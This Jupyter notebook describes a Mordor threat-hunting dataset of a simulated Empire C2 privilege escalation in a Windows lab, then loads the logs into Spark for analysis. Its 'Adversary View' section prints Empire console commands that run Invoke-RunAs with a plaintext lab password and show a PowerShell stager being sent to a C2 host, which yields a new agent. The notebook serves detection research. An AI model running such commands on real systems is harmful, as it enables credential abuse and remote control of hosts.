{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Empire Invoke Runas"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| id                | SD-190518204300 |\n",
    "| author            | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| creation date     | 19/05/18 |\n",
    "| platform          | Windows |\n",
    "| Mordor Environment| shire |\n",
    "| Simulation Type   | C2 |\n",
    "| Simulation Tool   | Empire |\n",
    "| Simulation Script | https://github.com/hunters-forge/mordor/blob/master/large_datasets/apt3/environment/empire/scripts/invoke-runas-cmd.ps1 |\n",
    "| Mordor Dataset    | https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/privilege_escalation/empire_invoke_runas.tar.gz |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries creating processes with explicit credentials (runas style)."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "(Empire: TKV35P8X) > scriptimport /tmp/invoke-runas-cmd.ps1\n",
    "[*] Tasked TKV35P8X to run TASK_SCRIPT_IMPORT\n",
    "[*] Agent TKV35P8X tasked with task ID 22\n",
    "script successfully saved in memory\n",
    "\n",
    "(Empire: TKV35P8X) > scriptcmd Invoke-RunAs -username pgustavo -password \"W1n1!19\" -domain shire -Cmd cmd.exe -Arguments \"/c C:\\windows\\system32\\autoupdate.vbs\"\n",
    "\n",
    "[*] Tasked TKV35P8X to run TASK_SCRIPT_COMMAND\n",
    "[*] Agent TKV35P8X tasked with task ID 23\n",
    "(Empire: TKV35P8X) > Job started: G16X7P\n",
    "\n",
    "Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                   \n",
    "-------  ------    -----      -----     ------     --  -- -----------                                                   \n",
    "    18       4     1528       1200       0.00   6732   1 cmd                                                           \n",
    "\n",
    "\n",
    "[*] Sending POWERSHELL stager (stage 1) to 10.0.10.103\n",
    "[*] New agent V6W3TH8Y checked in\n",
    "[+] Initial agent V6W3TH8Y from 10.0.10.103 now active (Slack)\n",
    "[*] Sending agent (stage 2) to V6W3TH8Y at 10.0.10.103\n",
    "\n",
    "(Empire: TKV35P8X) > agents\n",
    "\n",
    "[*] Active agents:\n",
    "\n",
    "Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n",
    "----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n",
    "H3DKB8SA ps 172.18.39.106   HR001             SHIRE\\nmartha           powershell         5172   5/0.0    2019-05-18 20:43:55  https           \n",
    "TKV35P8X ps 172.18.39.106   HR001             *SHIRE\\nmartha          powershell         5452   5/0.0    2019-05-18 20:43:51  https           \n",
    "EMDBFPSY ps 172.18.39.106   HR001             SHIRE\\nmartha           notepad            7924   5/0.0    2019-05-18 20:43:54  https           \n",
    "\n",
    "V6W3TH8Y ps 172.18.39.106   HR001             SHIRE\\pgustavo          powershell         5204   5/0.0    2019-05-18 20:43:52  https           \n",
    "\n",
    "(Empire: agents) >\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Explore Mordor Dataset"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Initialize Analytics Engine"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from openhunt.mordorutils import *\n",
    "spark = get_spark()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Download & Process Mordor File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "mordor_file = \"https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/privilege_escalation/empire_invoke_runas.tar.gz\"\n",
    "registerMordorSQLTable(spark, mordor_file, \"mordorTable\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Get to know your data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "df = spark.sql(\n",
    "    '''\n",
    "SELECT channel, COUNT(1)\n",
    "FROM mordorTable\n",
    "GROUP BY channel\n",
    "    '''\n",
    ")\n",
    "df.show(10,False)\n",
    "        "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 4
}
